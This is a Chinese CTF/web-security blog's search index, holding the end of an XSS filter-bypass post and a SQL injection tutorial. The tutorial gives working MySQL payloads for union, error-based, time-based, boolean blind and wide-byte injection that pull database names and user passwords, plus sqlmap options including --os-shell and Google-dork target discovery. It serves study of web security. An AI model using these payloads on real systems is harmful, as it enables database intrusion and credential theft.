class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>改为&lt;script</span><br></pre></td></tr></table></figure><h6 id="空格回车TAB："><a href="#空格回车TAB：" class="headerlink" title="空格回车TAB："></a>空格回车TAB：</h6><p>例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js伪协议javascript:alert(&#x27;xss&#x27;);可以改为java script:alert(&#x27;xss’);等</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2023/01/11/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/01/11/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h2><p>针对SQL注入的攻击行为可描述为通过用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序意料之外结果的攻击行为。</p><p>其成因可归结为以下两个原理叠加造成：</p><ol><li>程序编写者在处理程序和数据库交互时，使用字符串<strong>拼接的方式构造SQL语句</strong>。</li><li><strong>未对用户可控参数进行足够的过滤</strong>便将参数内容拼接进入到SQL语句中。</li></ol><hr><h2 id="2-漏洞危害"><a href="#2-漏洞危害" class="headerlink" title="2.漏洞危害"></a>2.漏洞危害</h2><p>SQL注入漏洞根据不同的标准，从数据类型分类来看 SQL注入分为数字型和字符型。 数字型注入就是说注入点的数据，拼接到SQL语句中是以数字型出现的，即数据两边没有被单引号、双引号包括。 字符型注入正好相反 按照提交数据的位置分类GET、POST、Cookie和称GPC 数据库对基本的数据类型分为三大类：数字、文本、时间</p><hr><h2 id="3-寻找SQL注入"><a href="#3-寻找SQL注入" class="headerlink" title="3.寻找SQL注入"></a>3.寻找SQL注入</h2><p>测试注入点：</p><ol><li>在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在Sql注入</li><li>注入点判断：<code>id=1&#39;（常见）</code>id&#x3D;1” id&#x3D;1’) id&#x3D;1’)) id&#x3D;1”) id&#x3D;1”))。+1、-1   有变化有回显考虑联合查询；有变化有报错考虑报错注入；没变化没报错没回显考虑布尔盲注；没有以上情况，考虑延时注入</li><li>通过构造get、post、cookie请求再相应的http头信息等查找敏感信息</li><li>通过构造一些语句，检测服务器中响应的异常</li></ol><hr><h2 id="4-MySQL注入"><a href="#4-MySQL注入" class="headerlink" title="4.MySQL注入"></a>4.MySQL注入</h2><h3 id="1-普通注入"><a href="#1-普通注入" class="headerlink" title="1.普通注入"></a>1.普通注入</h3><h5 id="1-判断字段个数（列数）"><a href="#1-判断字段个数（列数）" class="headerlink" title="1.判断字段个数（列数）"></a>1.判断字段个数（列数）</h5><p>使用<code>order by</code>语句来判断当前select 语句所查询的虚拟列表的列数。</p><p><code>order by</code>语句本意时按照某一列进行排序，在mysql 中可以使用数字来代替具体的列名，比如<code>order by 1</code> 就是按照第一列进行排序，如果mysql 没有找到对应的列，就会报错<code>Unkown column</code>.我们可以依次增加数字，直到数据库报错。</p><p>得到字段个数之后，可以尝试构造联合查询语句<br>这里我们并不知道表名，根据mysql 数据库的特性，select 语句执行过程中，并不需要指定表名。</p><p>页面显示的是第一张虚拟表的内容,那么我们可以考虑让第一张虚拟表的查询条件为假，则显示第二条记录。因此构造SQL，语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=33&#x27; and 1=2 union select 1,2,3,4,5,6,7,8,9,10,-- +</span><br><span class="line">?id=-33&#x27; 1=2 union select 1,2,3,4,5,6,7,8,9,10,-- +</span><br></pre></td></tr></table></figure><h5 id="2-数据库"><a href="#2-数据库" class="headerlink" title="2.数据库"></a>2.数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3-- +</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata #</span><br></pre></td></tr></table></figure><h5 id="3-数据表"><a href="#3-数据表" class="headerlink" title="3.数据表"></a>3.数据表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;数据库&#x27;#</span><br></pre></td></tr></table></figure><h5 id="4-字段"><a href="#4-字段" class="headerlink" title="4.字段"></a>4.字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;数据表&#x27;#</span><br></pre></td></tr></table></figure><h5 id="5-数据值"><a href="#5-数据值" class="headerlink" title="5.数据值"></a>5.数据值</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(0x7e,字段,0x7e),3 from 数据库名.数据表名--+</span><br></pre></td></tr></table></figure><h5 id="6-一些其他函数"><a href="#6-一些其他函数" class="headerlink" title="6.一些其他函数"></a>6.一些其他函数</h5><p><code>system_user()</code>系统用户名；<code>user()</code>用户名；<code>current_user()</code>当前用户名；<code>database()</code>数据库名；<code>version() MYSQL</code>数据库版本；<code>load_file() </code>MYSQL读取本地文件的函数；<code>@@datadir </code>读取数据库路径；<code>@@basedir MYSQL </code>安装路径；<code>@@version_compile_os </code>操作系统</p><p>多条数据显示函数：<code>concat()、group_concat()、concat_ws()</code></p><hr><h3 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h3><h5 id="1-extractvalue函数"><a href="#1-extractvalue函数" class="headerlink" title="1.extractvalue函数"></a>1.extractvalue函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select @@version),0x7e))--+ (版本号)</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select @@version_compile_os),0x7e))--+ (操作系统)</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e))--+ （数据库）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e))--+ （数据表）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e))--+（字段）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e))--+ （数据）</span><br></pre></td></tr></table></figure><h5 id="2-updatexml函数"><a href="#2-updatexml函数" class="headerlink" title="2.updatexml函数"></a>2.updatexml函数</h5><p>细节问题： <code>extractvalue()</code>基本一样，改个关键字<code>updatexml</code>即可,与<code>extractvalue</code>有个很大的区别实在末尾注入加上，如：<code>（1，concat(select @@version),1)</code>,而extractvalue函数末尾不加1（数值）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),1)--+ （数据库）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)--+ （数据表）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 3,1),0x7e),1)--+ （字段）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e),1)--+ （数据）</span><br></pre></td></tr></table></figure><h5 id="3-floor函数"><a href="#3-floor函数" class="headerlink" title="3.floor函数"></a>3.floor函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ (数据库，不断改变limit得到其他)</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （users表）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （password字段）</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （数值）</span><br></pre></td></tr></table></figure><hr><h3 id="3-延时注入"><a href="#3-延时注入" class="headerlink" title="3.延时注入"></a>3.延时注入</h3><h5 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(5)--+ //正常休眠</span><br><span class="line">?id=1&quot; and sleep(5)--+ //无休眠</span><br><span class="line">?id=1&#x27;) and sleep(5)--+//无休眠</span><br><span class="line">?id=1&quot;) and sleep(5)--+//无休眠</span><br><span class="line">?id=1&#x27; and if(length(database())=8,sleep(10),1)--+</span><br></pre></td></tr></table></figure><h5 id="2-获取数据库"><a href="#2-获取数据库" class="headerlink" title="2.获取数据库"></a>2.获取数据库</h5><p>通过判断服务器没有睡眠，ascii码转换115为s ，那么就得出数据库第一个字符为s,下面就可以依次类推了。substr(database(),N,1)可以通过改变N的值来判断数据的第几个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,1,sleep(10))-- +</span><br></pre></td></tr></table></figure><h5 id="3-获取数据表"><a href="#3-获取数据表" class="headerlink" title="3.获取数据表"></a>3.获取数据表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot;limit 0,1),1,1)))=101,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><hr><h3 id="4-布尔注入"><a href="#4-布尔注入" class="headerlink" title="4.布尔注入"></a>4.布尔注入</h3><p>判断是否存在布尔盲注(一般页面屏蔽了错显，正确类错误类都返回对应相同的页面)—-布尔注入(mysql5.0及以上自带库信息，利用ascii转换数字判断，为了更快捷的获取结果，利用工具burp suit快速组合）</p><h5 id="1-判断是否存在布尔盲注"><a href="#1-判断是否存在布尔盲注" class="headerlink" title="1.判断是否存在布尔盲注"></a>1.判断是否存在布尔盲注</h5><p><code>order by 1,2… </code>判断当前字段数，<code>union select 1,2 …</code> 查询成功但是发现无输出点展示，结论：屏蔽联合查询输出点，可能使用布尔盲注能注入</p><h5 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h5><p>可手工，也可利用工具brupsuit，提高效率。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(table_name) from information_Schema.tables where table_schema=database())=3 </span><br></pre></td></tr></table></figure><p>可通过大于小于快速锁定范围，查看库，查看库里表名数量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select length(table_name) from information_Schema.tables where table_schema=database() limit 0,1)=6</span><br></pre></td></tr></table></figure><p>这里可以通过<code>length()</code>函数可以查看第一个表名的字符数长度为6，然后可以limit 一条条看名表字符长度.此刻我们知道表的长度及库名，我们可通过ascii函数转变为数字来判断,一个一个字符来确认表名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select table_name from information_Schema.tables where table_schema=database() limit 0,1),1,1))</span><br><span class="line">=108</span><br></pre></td></tr></table></figure><p>这里可以确认第一个字符为108，<code>substr(str，起始位，截取位数)</code>截取函数，sacii（str）函数将单个字符转化为十六进制数字.</p><p>同样得方法可以获得字段及记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select column_name from information_Schema.columns where table_Schema=database() and table_name=“xxx” limit 0,1),1,1))=90 获取字段</span><br><span class="line">and ascii(substr((select xxx from xxx limit 0,1),1,1))=90 获取数据</span><br></pre></td></tr></table></figure><hr><h3 id="5-宽字节注入"><a href="#5-宽字节注入" class="headerlink" title="5.宽字节注入"></a>5.宽字节注入</h3><p>前提</p><ol><li><p>使用了addslashes()函数</p></li><li><p>数据库设置了编码模式为GBK</p></li></ol><p>原理：前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=%df&#x27; and 1=1 --+</span><br><span class="line">?id=%df&#x27; and 1=2 --+</span><br><span class="line">?id=-1%df&#x27; union select 1,2,3 %23</span><br></pre></td></tr></table></figure><hr><h3 id="6-sqlmap"><a href="#6-sqlmap" class="headerlink" title="6.sqlmap"></a>6.sqlmap</h3><h5 id="1-get注入"><a href="#1-get注入" class="headerlink" title="1.get注入"></a>1.get注入</h5><p>-u “url”    检测注入点<br>–dbs       列出所有数据库的名字<br>–current-db    列出当前数据的名<br>-D      指定一个数据库<br>–tables    列出表名<br>-T  指定表名<br>–columns   列出所有字段名<br>-C  指定字段<br>–dump  列出字段内容</p><h5 id="2-post注入"><a href="#2-post注入" class="headerlink" title="2.post注入"></a>2.post注入</h5><p>-r post.txt 从文件中读入http请求（post.txt是用burpsuite抓取得post数据包构成）<br>–os-shell  获取shell<br>sqlmap -g “inurl:php?id&#x3D;”   利用google 自动搜索注入点</p><h5 id="3-携带cookie-的认证"><a href="#3-携带cookie-的认证" class="headerlink" title="3.携带cookie 的认证"></a>3.携带cookie 的认证</h5><p>要测试的页面只有在登录状态下才能访问，登录状态用cookie识别<br>–cookie “”</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[#footer {    background: transparent !important;}#page-header{    background: transparent !important;}#footer::before{    background: transparent !important;}#page-header::before{    background: transparent !important;}[data-theme="dark"] #footer::before{    background: transparent !important;}[data-theme="dark"] #page-header::before{    background: transparent !important;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
